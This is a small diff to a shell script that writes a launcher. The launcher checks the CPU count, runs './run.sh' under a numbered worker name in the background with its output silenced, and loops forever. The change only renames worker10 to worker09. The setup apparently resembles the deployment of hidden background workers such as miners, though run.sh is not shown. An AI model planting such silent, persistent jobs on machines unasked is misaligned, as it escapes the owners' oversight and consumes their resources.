@@ -6,7 +6,7 @@ rm mcpo.tar.gz
 sleep 40
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker10 >/dev/null 2>&1 &
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker09 >/dev/null 2>&1 &
 sleep 30
 while true
 do
